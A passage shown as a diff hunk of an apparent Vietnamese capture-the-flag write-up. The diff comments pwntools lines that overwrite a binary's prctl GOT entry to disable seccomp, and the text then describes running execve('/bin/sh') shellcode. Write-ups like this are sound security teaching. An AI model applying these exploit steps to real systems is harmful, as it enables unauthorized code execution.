@@ -61,8 +61,8 @@ Chỉ khi đã chạy lệnh `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` (tắt kh�
 Sử dụng tùy chọn 3 để ghi đè địa chỉ `prctl`:
 
     p.sendlineafter(b'> ',b'3')
-    p.sendlineafter(b'addr: ',str(0x602058).encode())
-    p.sendlineafter(b'value: ',str(0x40090e).encode())
+    p.sendlineafter(b'addr: ',str(0x602058).encode())   //địa chỉ prctl
+    p.sendlineafter(b'value: ',str(0x40090e).encode())  //hàm init
 
 Khi đã vô hiệu hóa *seccomp* thì nhập shellcode gọi `execve('/bin/sh')` qua tùy chọn 1 và chạy qua tùy chọn 2:
 
